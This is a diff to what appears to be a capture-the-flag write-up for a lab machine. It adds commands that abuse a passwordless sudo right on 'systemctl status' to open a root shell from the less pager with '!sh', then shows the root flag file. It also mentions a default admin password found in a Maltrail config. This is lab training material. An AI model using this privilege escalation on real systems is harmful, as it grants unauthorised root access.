@@ -168,7 +168,26 @@ User puma may run the following commands on sau:
     (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
 ```
 
-This can be exploited to spawn a shell ([article](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/#spawn-shell-in-the-pager))
+This sudo privilege can be exploited to spawn a shell ([article](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/#spawn-shell-in-the-pager)), see commands below:
+
+```bash
+# run the command with sudo.
+sudo systemctl status example.service
+
+# enter a command in the pager like less.
+less
+
+# spawn shell
+!sh
+```
+
+Can then get the root flag:
+
+```bash
+# ls -lar
+total 44
+-rw-r-----  1 root root   33 Aug  7 16:46 root.txt
+```
 
 Check the `maltrail.conf` file and found default password for admin:
 
